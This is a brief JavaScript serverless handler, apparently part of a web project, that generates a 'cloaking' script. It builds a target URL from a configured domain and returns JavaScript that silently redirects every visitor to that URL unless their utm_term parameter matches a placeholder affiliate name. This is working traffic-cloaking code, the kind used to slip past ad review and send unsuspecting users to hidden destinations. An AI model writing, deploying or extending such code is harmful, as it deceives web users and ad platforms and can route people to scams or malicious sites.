import domains from '../config/domains.json'

export async function handleCloakingScript(context) {

  if (context.params.catchall.length !== 5) {
    return new Response('Invalid destination', { status: 400 });
  }

  const domain = domains[0];
  //const domain = domains[[(Math.floor(Math.random() * domains.length))]];

  const targetUrl = domain + context.params.catchall.join('/');

  const jsContent = `
    var urlParams = new URLSearchParams(window.location.search);
    var utmAidName = urlParams.get('utm_term');
        
    if (utmAidName != '__AID_NAME__') {
        window.location.href = '${targetUrl}';
    }
  `;

  return new Response(jsContent, {
    headers: { 'Content-Type': 'application/json' },
  });
}